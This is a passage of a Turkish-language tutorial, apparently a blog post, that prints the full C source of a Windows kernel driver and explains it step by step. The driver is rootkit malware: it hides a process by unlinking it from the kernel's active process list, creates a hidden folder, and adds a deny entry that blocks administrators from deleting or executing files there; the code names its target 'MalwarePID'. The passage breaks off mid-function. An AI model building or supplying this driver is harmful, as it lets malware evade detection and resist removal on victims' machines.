RTL_CONSTANT_STRING(L\"\\\\??\\\\C:Windows\\\\System32\\\\HiddenFile\\\\\"); PVOID GetKernelBase() { fp_ZwQuerySystemInformation fpZwQuerySystemInformation; PRTL_PROCESS_MODULES Modules; UNICODE_STRING QuerySystemInfoStr; PVOID KernelBase = NULL; ULONG Bytes = 0; NTSTATUS Status; RtlInitUnicodeString(\u0026QuerySystemInfoStr, L\"ZwQuerySystemInformation\"); fpZwQuerySystemInformation = (fp_ZwQuerySystemInformation)MmGetSystemRoutineAddress(\u0026QuerySystemInfoStr); if (NULL == fpZwQuerySystemInformation) { return NULL; } DbgPrintEx(0, 0, \"[+] ZwQuerySystemInformation Address: 0x%p\\n\", fpZwQuerySystemInformation); Status = fpZwQuerySystemInformation(SystemModuleInformation, NULL, 0, \u0026Bytes); if (STATUS_INFO_LENGTH_MISMATCH != Status) { return NULL; } Modules = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag(NonPagedPool, Bytes, 'modl'); if (NULL == Modules) { return NULL; } Status = fpZwQuerySystemInformation(SystemModuleInformation, Modules, Bytes, \u0026Bytes); if (!NT_SUCCESS(Status)) { return NULL; } KernelBase = Modules-\u003eModules[0].ImageBase; ExFreePool(Modules); return KernelBase; } PVOID FindFunction(PVOID KernelBaseAddress, PCSTR TargetFunctionName) { PIMAGE_EXPORT_DIRECTORY ExportDirectory; PIMAGE_DOS_HEADER DosHeader; PIMAGE_NT_HEADERS NTHeader; PVOID FoundFuncAddress = NULL; PCSTR CurrentFunction = NULL; PUSHORT Ordinals = 0; USHORT TargetOrdinal = 0; PULONG Functions = 0; PULONG Names = 0; ULONG ExportDirectoryRVA; DosHeader = (PIMAGE_DOS_HEADER)KernelBaseAddress; if (IMAGE_DOS_SIGNATURE != DosHeader-\u003ee_magic) { DbgPrintEx(0, 0, \"[-] Invalid DOS Header Signature!\\n\"); return NULL; } NTHeader = (PIMAGE_NT_HEADERS)((PUCHAR)KernelBaseAddress + DosHeader-\u003ee_lfanew); if (IMAGE_NT_SIGNATURE != NTHeader-\u003eSignature) { DbgPrintEx(0, 0, \"[-] Invalid NT Header Signature!\\n\"); return NULL; } ExportDirectoryRVA = NTHeader-\u003eOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; if (!ExportDirectoryRVA) { DbgPrintEx(0, 0, \"[-] No Export Directory Found!\\n\"); return NULL; } ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)KernelBaseAddress + ExportDirectoryRVA); if (!ExportDirectory) { DbgPrintEx(0, 0, \"[-] Export Directory not Found!\\n\"); return NULL; } DbgPrintEx(0, 0, \"[+] Export Directory Found at 0x%p\\n\", ExportDirectory); Names = (PULONG)((PUCHAR)KernelBaseAddress + ExportDirectory-\u003eAddressOfNames); Ordinals = (PUSHORT)((PUCHAR)KernelBaseAddress + ExportDirectory-\u003eAddressOfNameOrdinals); Functions = (PULONG)((PUCHAR)KernelBaseAddress + ExportDirectory-\u003eAddressOfFunctions); for (ULONG i = 0; i \u003c ExportDirectory-\u003eNumberOfNames; i++) { CurrentFunction = (PCSTR)((PUCHAR)KernelBaseAddress + Names[i]); if (strcmp(CurrentFunction, TargetFunctionName) == 0) { TargetOrdinal = Ordinals[i]; FoundFuncAddress = (PVOID)((PUCHAR)KernelBaseAddress + Functions[TargetOrdinal]); DbgPrintEx(0, 0, \"[+] Function %s found at 0x%p Address!\\n\", TargetFunctionName, FoundFuncAddress); return FoundFuncAddress; } } DbgPrintEx(0, 0, \"[-] %s not Found in Export Table!\\n\", TargetFunctionName); return NULL; } NTSTATUS SetFolderPermissions(UNICODE_STRING ImagePath, ACCESS_MASK CurrentAccessMask) { fpRtlAddAccessDeniedAceEx fp_RtlAddAccessDeniedAceEx; SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY; PSECURITY_DESCRIPTOR SecurityDescriptor = NULL; IO_STATUS_BLOCK IoStatusBlock; OBJECT_ATTRIBUTES ObjAttr; HANDLE HandleFile = NULL; PACL Acl = NULL; ULONG AclSize = 0; PSID AdminSid = NULL; SID AdminSidStatic; PVOID RtlAddAccessDeniedAceExAddr = NULL; PVOID KernelAddress = NULL; NTSTATUS Status; KernelAddress = GetKernelBase(); if (NULL == KernelAddress) { DbgPrintEx(0, 0, \"[-] Failed to Get Kernel Base Address!\\n\"); return STATUS_UNSUCCESSFUL; } DbgPrintEx(0, 0, \"[+] Kernel Base Address: 0x%p\\n\", KernelAddress); RtlAddAccessDeniedAceExAddr = FindFunction(KernelAddress, \"RtlAddAccessDeniedAceEx\"); if (NULL == RtlAddAccessDeniedAceExAddr) { DbgPrintEx(0, 0, \"[-] Failed to Find RtlAddAccessDeniedAceEx Function!\\n\"); return STATUS_UNSUCCESSFUL; } fp_RtlAddAccessDeniedAceEx = (fpRtlAddAccessDeniedAceEx)RtlAddAccessDeniedAceExAddr; InitializeObjectAttributes(\u0026ObjAttr, \u0026ImagePath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL); Status = ZwOpenFile(\u0026HandleFile, READ_CONTROL | WRITE_DAC, \u0026ObjAttr, \u0026IoStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, \\ FILE_DIRECTORY_FILE); if (!NT_SUCCESS(Status)) { return Status; } SecurityDescriptor = ExAllocatePoolWithTag(PagedPool, SECURITY_DESCRIPTOR_MIN_LENGTH, 'Secd'); if (NULL == SecurityDescriptor) { ZwClose(HandleFile); return STATUS_INSUFFICIENT_RESOURCES; } Status = RtlCreateSecurityDescriptor(SecurityDescriptor, SECURITY_DESCRIPTOR_REVISION); if (!NT_SUCCESS(Status)) { ExFreePoolWithTag(SecurityDescriptor, 'Secd'); ZwClose(HandleFile); return Status; } /* Include Admin and User */ RtlInitializeSid(\u0026AdminSidStatic, \u0026NtAuthority, 2); *RtlSubAuthoritySid(\u0026AdminSidStatic, 0) = SECURITY_BUILTIN_DOMAIN_RID; *RtlSubAuthoritySid(\u0026AdminSidStatic, 1) = DOMAIN_ALIAS_RID_ADMINS; AdminSid = \u0026AdminSidStatic; AclSize = sizeof(ACL) + sizeof(ACCESS_DENIED_ACE) - sizeof(ULONG) + RtlLengthSid(AdminSid); Acl = ExAllocatePoolWithTag(PagedPool, AclSize, 'ACLT'); if (NULL == Acl) { ExFreePoolWithTag(SecurityDescriptor, 'Secd'); ZwClose(HandleFile); return STATUS_INSUFFICIENT_RESOURCES; } Status = RtlCreateAcl(Acl, AclSize, ACL_REVISION); if (!NT_SUCCESS(Status)) { ExFreePoolWithTag(Acl, 'ACLT'); ExFreePoolWithTag(SecurityDescriptor, 'Secd'); ZwClose(HandleFile); return Status; } Status = fp_RtlAddAccessDeniedAceEx(Acl, ACL_REVISION, OBJECT_INHERIT_ACE | CONTAINER_INHERIT_ACE, CurrentAccessMask, AdminSid); if (!NT_SUCCESS(Status)) { ExFreePoolWithTag(Acl, 'ACLT'); ExFreePoolWithTag(SecurityDescriptor, 'Secd'); ZwClose(HandleFile); return Status; } Status = RtlSetDaclSecurityDescriptor(SecurityDescriptor, TRUE, Acl, FALSE); if (!NT_SUCCESS(Status)) { ExFreePoolWithTag(Acl, 'ACLT'); ExFreePoolWithTag(SecurityDescriptor, 'Secd'); ZwClose(HandleFile); return Status; } Status = ZwSetSecurityObject(HandleFile, DACL_SECURITY_INFORMATION, SecurityDescriptor); if (!NT_SUCCESS(Status)) { ExFreePoolWithTag(Acl, 'ACLT'); ExFreePoolWithTag(SecurityDescriptor, 'Secd'); ZwClose(HandleFile); return Status; } ExFreePoolWithTag(Acl, 'ACLT'); ExFreePoolWithTag(SecurityDescriptor, 'Secd'); ZwClose(HandleFile); return Status; } NTSTATUS GetWindowsVersion(ULONG* MajorVersion, ULONG* MinorVersion, ULONG* BuildNumber) { RTL_OSVERSIONINFOW VersionInfo = { 0 }; NTSTATUS Status; VersionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW); Status = RtlGetVersion(\u0026VersionInfo); if (!NT_SUCCESS(Status)) { return Status; } *MajorVersion = VersionInfo.dwMajorVersion; *MinorVersion = VersionInfo.dwMinorVersion; *BuildNumber = VersionInfo.dwBuildNumber; return STATUS_SUCCESS; } ULONG GetActiveProcessLinkOffset() { ULONG MajorVersion = 0; ULONG MinorVersion = 0; ULONG BuildNumber = 0; NTSTATUS Status; Status = GetWindowsVersion(\u0026MajorVersion, \u0026MinorVersion, \u0026BuildNumber); if (!NT_SUCCESS(Status)) { return 0; } if (10 == MajorVersion \u0026\u0026 22000 \u003e= MajorVersion) { return 0x448; } else if (10 == MajorVersion) { return 0x448; } else if (6 == MajorVersion \u0026\u0026 3 == MinorVersion) { return 0x2e8; } else if (6 == MajorVersion \u0026\u0026 1 == MinorVersion) { return 0x118; } return 0; } NTSTATUS HideProcess(HANDLE ProcessID) { PLIST_ENTRY ActiveProcessLink; PEPROCESS Process; ULONG Offset; NTSTATUS Status; Status = PsLookupProcessByProcessId(ProcessID, \u0026Process); if (!NT_SUCCESS(Status)) { return Status; } Offset = GetActiveProcessLinkOffset(); if (0 == Offset) { return STATUS_NOT_SUPPORTED; } ActiveProcessLink = (PLIST_ENTRY)((PUCHAR)Process + Offset); RemoveEntryList(ActiveProcessLink); return STATUS_SUCCESS; } NTSTATUS CreateHiddenFile() { HANDLE HandleDirectory = NULL; HANDLE HandleFile = NULL; OBJECT_ATTRIBUTES ObjAttr; IO_STATUS_BLOCK IoStatusBlock; NTSTATUS Status; InitializeObjectAttributes(\u0026ObjAttr, \u0026G_ExecutablePath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL); Status = ZwCreateFile(\u0026HandleDirectory, GENERIC_ALL, \u0026ObjAttr, \u0026IoStatusBlock, NULL, FILE_ATTRIBUTE_DIRECTORY | FILE_ATTRIBUTE_HIDDEN, \\ FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); if (!NT_SUCCESS(Status)) { return Status; } ZwClose(HandleDirectory); return STATUS_SUCCESS; } NTSTATUS DispatchIOControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); HANDLE MalwarePID; ULONG InputBufferLength; BOOLEAN ProcessRunning = TRUE; NTSTATUS Status; switch (Stack-\u003eParameters.DeviceIoControl.IoControlCode) { case IOCTL_CREATE_DIRECTORY: Status = CreateHiddenFile(); if (!NT_SUCCESS(Status)) { if (STATUS_OBJECT_NAME_COLLISION == Status) { Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = 0; break; } Irp-\u003eIoStatus.Status = Status; Irp-\u003eIoStatus.Information = 0; break; } Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = 0; break; case IOCTL_HIDE_PROCESS: MalwarePID = *((HANDLE*)Irp-\u003eAssociatedIrp.SystemBuffer); InputBufferLength = Stack-\u003eParameters.DeviceIoControl.InputBufferLength; if (NULL == MalwarePID) { Irp-\u003eIoStatus.Status = STATUS_INVALID_DEVICE_REQUEST; Irp-\u003eIoStatus.Information = 0; break; } Status = HideProcess(MalwarePID); if (!NT_SUCCESS(Status)) { Irp-\u003eIoStatus.Status = Status; Irp-\u003eIoStatus.Information = 0; break; } Status = SetFolderPermissions(G_ExecutablePath, DELETE | FILE_EXECUTE); if (!NT_SUCCESS(Status)) { Irp-\u003eIoStatus.Status = Status; Irp-\u003eIoStatus.Information = 0; break; } Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = InputBufferLength; break; default: Irp-\u003eIoStatus.Status = STATUS_INVALID_DEVICE_REQUEST; Irp-\u003eIoStatus.Information = 0; break; } IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS DispatchCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); switch (Stack-\u003eMajorFunction) { case IRP_MJ_CREATE: Irp-\u003eIoStatus.Status = STATUS_SUCCESS; break; case IRP_MJ_CLOSE: Irp-\u003eIoStatus.Status = STATUS_SUCCESS; break; default: Irp-\u003eIoStatus.Status = STATUS_INVALID_DEVICE_REQUEST; break; } Irp-\u003eIoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); UNICODE_STRING DeviceName; UNICODE_STRING SymLink; PDEVICE_OBJECT DeviceObject; NTSTATUS Status; RtlInitUnicodeString(\u0026DeviceName, L\"\\\\Device\\\\MyDevice\"); RtlInitUnicodeString(\u0026SymLink, L\"\\\\??\\\\MyDevice\"); Status = IoCreateDevice(DriverObject, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Device!\\n\"); return Status; } Status = IoCreateSymbolicLink(\u0026SymLink, \u0026DeviceName); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Symbolic Link!\\n\"); return Status; } DriverObject-\u003eMajorFunction[IRP_MJ_CREATE] = DispatchCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_CLOSE] = DispatchCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIOControl; DriverObject-\u003eDriverUnload = UnloadDriver; return STATUS_SUCCESS; } NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) { UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); DbgPrintEx(0, 0, \"Unloading the Driver...\\n\"); IoDeleteSymbolicLink(\u0026SymName); IoDeleteDevice(DriverObject-\u003eDeviceObject); return STATUS_SUCCESS; } Kodlar uzun gözüküyor gibi görünse de emin olun çok da zor değil. İlk olarak DriverEntry içerisinden başlayalım:\nNTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); UNICODE_STRING DeviceName; UNICODE_STRING SymLink; PDEVICE_OBJECT DeviceObject; NTSTATUS Status; RtlInitUnicodeString(\u0026DeviceName, L\"\\\\Device\\\\MyDevice\"); RtlInitUnicodeString(\u0026SymLink, L\"\\\\??\\\\MyDevice\"); Status = IoCreateDevice(DriverObject, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Device!\\n\"); return Status; } Status = IoCreateSymbolicLink(\u0026SymLink, \u0026DeviceName); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Symbolic Link!\\n\"); return Status; } DriverObject-\u003eMajorFunction[IRP_MJ_CREATE] = DispatchCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_CLOSE] = DispatchCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIOControl; DriverObject-\u003eDriverUnload = UnloadDriver; return STATUS_SUCCESS; } Eğer bu kısma göz attıysanız çok yabancı gelmeyecektir. Bu işlemler önceki IOCTL ve IRP konulardan gördüğümüz adımlar. Bu yüzden bu kısımları özetleyerek devam edeceğim.\nIoCreateDevice ile bir Device oluşturuyoruz. Bu işlem sonrasında user-mode programın driver ile iletişim kurabilmesi için IoCreateSymbolicLink fonksiyonu ile bir sembolik link oluşturuyoruz.\nSon olarak ise IRP istekleri için fonksiyonlarımızı ayarlıyoruz. Şimdi IOCTL kodlarını işleyen fonksiyona göz atalım.\nIOCTL geçmeden önce, bu projede iki tane IOCTL kodu yer almaktadır:\nIOCTL_CREATE_DIRECTORY: Gizli bir klasör oluşturmak için kullanılacak IOCTL kodu. IOCTL_HIDE_PROCESS: Process’i gizlemek için kullanılacak IOCTL kodu switch (Stack-\u003eParameters.DeviceIoControl.IoControlCode) { case IOCTL_CREATE_DIRECTORY:\tStatus = CreateHiddenFile(); if (!NT_SUCCESS(Status)) { if (STATUS_OBJECT_NAME_COLLISION == Status) { Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = 0; break; } Irp-\u003eIoStatus.Status = Status; Irp-\u003eIoStatus.Information = 0; break; } Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = 0; break; İlk olarak IOCTL_CREATE_DIRECTORY kodu işlenmektedir. Bu kod, gizli bir klasör oluşturmak için kullanılır. Bu işlemi gerçekleştirmek için CreateHiddenFile fonksiyonu çağırılmaktadır.\nFonksiyonun çağırılması ardından fonksiyonun geri dönüş değerini kontrol ediyoruz. Eğer değer, STATUS_SUCCESS değilse bu if yapısında bir kontrol daha gerçekleştiriyoruz.\nBu kontrolde Status değerinin STATUS_OBJECT_NAME_COLLISION olup olmadığını kontrol ediyoruz. Bu hata kodu, klasörün zaten oluşturulduğunu - yani oluşturulmak istenilen klasörün zaten var olduğunu - belirten bir kod hatasıdır. Dolayasıyla ZwCreateFile bu hata koduna düşüyorsa demek ki oluturulmak istenilen klasör zaten var demektir. Bu durumda STATUS_SUCCESS kodu ile return ediyoruz.\nNTSTATUS CreateHiddenFile() { HANDLE HandleDirectory = NULL; HANDLE HandleFile = NULL; OBJECT_ATTRIBUTES ObjAttr; IO_STATUS_BLOCK IoStatusBlock; NTSTATUS Status; InitializeObjectAttributes(\u0026ObjAttr, \u0026G_ExecutablePath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL); Status = ZwCreateFile(\u0026HandleDirectory, GENERIC_ALL, \u0026ObjAttr, \u0026IoStatusBlock, NULL, FILE_ATTRIBUTE_DIRECTORY | FILE_ATTRIBUTE_HIDDEN, \\ FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); if (!NT_SUCCESS(Status)) { return Status; } ZwClose(HandleDirectory); return STATUS_SUCCESS; } Bu fonksiyondaki adımlar ise basit. İlk olarak OBJECT_ATTRIBUTES yapısını oluşturuyoruz. Bu yapıyı oluşturmamızın sebebi, gizli klasörün özellikleri tanımlamak için.\nDaha sonra ZwCreateFile ile klasörü GENERIC_ALL yani tam yetki ile oluşturuyoruz. Bu işlem sonrasında klasörü kapatıyoruz ve STATUS_SUCCESS kodu ile return ediyoruz. Eğer başarısız olursa hata kodunu return ediyoruz.\ncase IOCTL_HIDE_PROCESS: MalwarePID = *((HANDLE*)Irp-\u003eAssociatedIrp.SystemBuffer); InputBufferLength = Stack-\u003eParameters.DeviceIoControl.InputBufferLength; if (NULL == MalwarePID) { Irp-\u003eIoStatus.Status = STATUS_INVALID_DEVICE_REQUEST; Irp-\u003eIoStatus.Information = 0; break; } Status = HideProcess(MalwarePID); if (!NT_SUCCESS(Status)) { Irp-\u003eIoStatus.Status = Status; Irp-\u003eIoStatus.Information = 0; break; } Status = SetFolderPermissions(G_ExecutablePath, DELETE | FILE_EXECUTE); if (!NT_SUCCESS(Status)) { Irp-\u003eIoStatus.Status = Status; Irp-\u003eIoStatus.Information = 0; break; } Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = InputBufferLength; break; Daha sonra ise IOCTL_HIDE_PROCESS kodu işlenmektedir. Bu kod, process’i gizlemek ve klasörün yetkilerini değiştirmek için kullanılacaktır.\nİlk adımda user-mode programdan gelen PID değerini HANDLE tipinde alıyoruz. Eğer bu değer NULL ise STATUS_INVALID_DEVICE_REQUEST kodu ile return ediyoruz.\nDaha sonra alınan PID değeri ile HideProcess fonksiyonunu çağırıyoruz. Bu fonksiyon, process’i gizlemek için kullanılır. Eğer HideProcess fonksiyonu başarısız olursa hata kodunu return ediyoruz.\nNTSTATUS HideProcess(HANDLE ProcessID) { PLIST_ENTRY ActiveProcessLink; PEPROCESS Process; ULONG Offset; NTSTATUS Status; Status = PsLookupProcessByProcessId(ProcessID, \u0026Process); if (!NT_SUCCESS(Status)) { return Status; } Offset = GetActiveProcessLinkOffset(); if (0 == Offset) { return STATUS_NOT_SUPPORTED; } } HideProcess fonksiyonuna göz attığımızda ilk adımda PsLookupProcessByProcessId fonksiyonu ile process’in EPROCESS yapısını alıyoruz.\nEPROCESS yapısı, sistem process’lerini tanımlayan bir çekirdek bellek yapısıdır. Sürecin görüntü adı, hangi masaüstü oturumunda çalıştığı veya hangi erişim belirtecine sahip olduğu ve çok daha fazlası gibi ayrıntıları içermektedir. Buradaki amacımız EPROCESS yapısından ActiveProcessLink yapısını almak.\ntypedef struct _EPROCESS { KPROCESS Pcb; EX_PUSH_LOCK ProcessLock; LARGE_INTEGER CreateTime; LARGE_INTEGER ExitTime; EX_RUNDOWN_REF RundownProtect; PVOID UniqueProcessId; LIST_ENTRY ActiveProcessLinks; ... } EPROCESS, *PEPROCESS; ActiveProcessLinks, sistemde çalışan tüm programları bir zincir gibi birbirine bağlayan bir yapıdır. Her programın (process’in) bilgilerini içeren bir yapı olan EPROCESS, ActiveProcessLinks ile bir liste gibi sıralanır. Bu sayede, her program bu zincire bir halka olarak eklenir. ActiveProcessLinks içinde, her programın önceki ve sonraki programlarla bağlantı kurmasını sağlayan LIST_ENTRY adlı bir yapı bulunur. Bu yapı sayesinde, sistemdeki tüm programlar birbirine bağlı bir şekilde takip edilebilir.\nActiveProcessLinks, bir programın bağlı olduğu listedeki önceki (Flink) ve sonraki (Blink) programları gösterir. Böylece sistemdeki tüm programlar, birbirine bağlı bir liste olarak tutulur.\ntypedef struct _LIST_ENTRY { struct _LIST_ENTRY *Flink; struct _LIST_ENTRY *Blink; } LIST_ENTRY, *PLIST_ENTRY; Bu yapıda Flink, bağlı listenin bir sonraki öğesini, Blink ise önceki öğesini işaret eder. Process’i gizlemek için yapacağımız işlemde, bu yapıyı kullanarak process’i listeden çıkaracağız.\nDaha sonra oluşturduğumuz GetActiveProcessLinkOffset fonksiyonu ile ActiveProcessLink yapısının offset değerini alıyoruz.\nULONG GetActiveProcessLinkOffset() { ULONG MajorVersion = 0; ULONG MinorVersion = 0; ULONG BuildNumber = 0; NTSTATUS Status; Status = GetWindowsVersion(\u0026MajorVersion, \u0026MinorVersion, \u0026BuildNumber); if (!NT_SUCCESS(Status)) { return 0; } if (10 == MajorVersion \u0026\u0026 22000 \u003e= MajorVersion) { return 0x448; } else if (10 == MajorVersion) { return 0x448; } else if (6 == MajorVersion \u0026\u0026 3 == MinorVersion) { return 0x2e8; } else if (6 == MajorVersion \u0026\u0026 1 == MinorVersion) { return 0x118; } return 0; } Bu fonksiyonda ise işletim sisteminin sürümüne göre ActiveProcessLink yapısının offset değerini alıyoruz. Bu offset değeri, işletim sisteminin sürümüne göre değişiklik gösterebildiği için farklı Windows sürümüne göre alınmasını sağlar.\nNormalde bu kullandığım yöntem çok sağlıklı olmayacaktır. Çünkü Windows güncellemeleri ile birlikte bu offset değerleri değişebilir ancak şuanlık 0x448 offset değeri windows 10 ve 11 sürümlerinde işe yarıyor. Diğerleri ise windows 7 ve 8 sürümlerine aittir.\nBu fonksiyonda ise öncelikle offset değeri bulmak için oluşturduğumuz GetWindowsVersion fonksiyonunu çağırıyoruz ve windows sürümünü alıyoruz. Ardından alınan değerlerle birlikte offset değerini return ediyoruz.\nOffset = GetActiveProcessLinkOffset(); if (0 == Offset) { return STATUS_NOT_SUPPORTED; } ActiveProcessLink = (PLIST_ENTRY)((PUCHAR)Process + Offset); RemoveEntryList(ActiveProcessLink); return STATUS_SUCCESS; HideProcess fonksiyonunun devamında ise ActiveProcessLink’in offset değerini aldıktan sonra RemoveEntryList ile bu Process’i listeden siliyoruz.\nStatus = SetFolderPermissions(G_ExecutablePath, DELETE | FILE_EXECUTE); if (!NT_SUCCESS(Status)) { Irp-\u003eIoStatus.Status = Status; Irp-\u003eIoStatus.Information = 0; break; } IOCTL_HIDE_PROCESS’ın son kısmında SetFolderPermissions fonksiyonu çağırılmaktadır. Bu fonksiyon, oluşturulan gizli klasörün yetkilerini değiştirmek için kullanılacaktır. Özellikle bu fonksiyona verilen parametrelere dikkat edin, G_ExecutablePath değişkeni yetkisi değiştirilmesi istenen dosyayı temsil ederken, DELETE | FILE_EXECUTE parametreleri ise hangi işlemlerin engelleneceğini belirtiliyoruz.\nNTSTATUS SetFolderPermissions(UNICODE_STRING ImagePath, ACCESS_MASK CurrentAccessMask) { ... KernelAddress = GetKernelBase(); if (NULL == KernelAddress) { DbgPrintEx(0, 0, \"[-] Failed to Get Kernel Base Address!\\n\"); return STATUS_UNSUCCESSFUL; } DbgPrintEx(0, 0, \"[+] Kernel Base Address: 0x%p\\n\", KernelAddress); SetFolderPermissions fonksiyonun ilk kısımlarında yetki değiştirmede adımları başlamadan önce RtlAccessDeniedAceEx fonksiyonun adresini almaya başlıyoruz. Bu API, belgelenmemiştir. Bu fonksiyon, bir güvenlik tanımlayıcısına (SID) dayalı bir erişim kontrol listesine (ACL) bir erişim reddi ACE’si ekler. Yani daha basit anlatmak gerekirse, belirli işlemi engellemek için kullanılır.\nİlk olarak oluşturduğumuz GetKernelBase ile kernel base adresini alıyoruz. Bu adres, kernel-mode sürücü içerisinde kernel base adresine ulaşmamızı sağlar.\nPVOID GetKernelBase() { fp_ZwQuerySystemInformation fpZwQuerySystemInformation; PRTL_PROCESS_MODULES Modules; UNICODE_STRING QuerySystemInfoStr; PVOID KernelBase = NULL; ULONG Bytes = 0; NTSTATUS Status; RtlInitUnicodeString(\u0026QuerySystemInfoStr, L\"ZwQuerySystemInformation\"); fpZwQuerySystemInformation = (fp_ZwQuerySystemInformation)MmGetSystemRoutineAddress(\u0026QuerySystemInfoStr); if (NULL == fpZwQuerySystemInformation) { return NULL; } DbgPrintEx(0, 0, \"[+] ZwQuerySystemInformation Address: 0x%p\\n\", fpZwQuerySystemInformation); Status = fpZwQuerySystemInformation(SystemModuleInformation, NULL, 0, \u0026Bytes); if (STATUS_INFO_LENGTH_MISMATCH != Status) { return NULL; } Modules = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag(NonPagedPool, Bytes, 'modl'); if (NULL == Modules) { return NULL; } Status = fpZwQuerySystemInformation(SystemModuleInformation, Modules, Bytes, \u0026Bytes); if (!NT_SUCCESS(Status)) { return NULL; } KernelBase = Modules-\u003eModules[0].ImageBase; ExFreePool(Modules); return KernelBase; } GetKernelBase fonksiyonuna göz attığımızda ilk olarak dökümanlanmamış ZwQuerySystemInformation fonksiyonun adresini alıyoruz. Bu fonksiyon, sistem hakkında bilgi almak için kullanılacaktır.\nBu API’in adresini aldıktan sonra ilk olarak boyutu almak için ZwQuerySystemInformation çağırıyoruz ve Bytes değişkenine boyutu aktarıyoruz. Daha sonra bu boyut kadar bellek ayırıyoruz ve tekrar ZwQuerySystemInformation fonksiyonunu çağırarak modüllerin bilgilerini alıyoruz ve KernelBase fonksiyonuna ImageBase değerini aktarıyoruz.\nRtlAddAccessDeniedAceExAddr = FindFunction(KernelAddress, \"RtlAddAccessDeniedAceEx\"); if (NULL == RtlAddAccessDeniedAceExAddr) { DbgPrintEx(0, 0, \"[-] Failed to Find RtlAddAccessDeniedAceEx Function!\\n\"); return STATUS_UNSUCCESSFUL; } fp_RtlAddAccessDeniedAceEx = (fpRtlAddAccessDeniedAceEx)RtlAddAccessDeniedAceExAddr; Daha sonra oluşturduğumuz FindFunction aracılığıyla export tablosundan RtlAddAccessDeniedAceEx fonksiyonun adresini alıyoruz ve oluşturduğumuz fp_RtlAddAccessDeniedAceEx yapısına bu adresi aktarıyoruz (Bu fonksiyon, main.h içerisinde tanımlı. Github’tan fonksiyonu inceleyebilirsiniz).\nPVOID FindFunction(PVOID KernelBaseAddress, PCSTR TargetFunctionName) { PIMAGE_EXPORT_DIRECTORY ExportDirectory; PIMAGE_DOS_HEADER DosHeader; PIMAGE_NT_HEADERS NTHeader; PVOID FoundFuncAddress = NULL; PCSTR CurrentFunction = NULL; PUSHORT Ordinals = 0; USHORT TargetOrdinal = 0; PULONG Functions = 0; PULONG Names = 0; ULONG ExportDirectoryRVA; DosHeader = (PIMAGE_DOS_HEADER)KernelBaseAddress; if (IMAGE_DOS_SIGNATURE != DosHeader-\u003ee_magic) { DbgPrintEx(0, 0, \"[-] Invalid DOS Header Signature!\\n\"); return NULL; } NTHeader = (PIMAGE_NT_HEADERS)((PUCHAR)KernelBaseAddress + DosHeader-\u003ee_lfanew); if (IMAGE_NT_SIGNATURE != NTHeader-\u003eSignature) { DbgPrintEx(0, 0, \"[-] Invalid NT Header Signature!\\n\"); return NULL; } ExportDirectoryRVA = NTHeader-\u003eOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; if (!ExportDirectoryRVA) { DbgPrintEx(0, 0, \"[-] No Export Directory Found!\\n\"); return NULL; } ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)KernelBaseAddress + ExportDirectoryRVA); if (!ExportDirectory) { DbgPrintEx(0, 0, \"[-] Export Directory not Found!\\n\"); return NULL; } DbgPrintEx(0, 0, \"[+] Export Directory Found at 0x%p\\n\", ExportDirectory); Names = (PULONG)((PUCHAR)KernelBaseAddress + ExportDirectory-\u003eAddressOfNames); Ordinals = (PUSHORT)((PUCHAR)KernelBaseAddress + 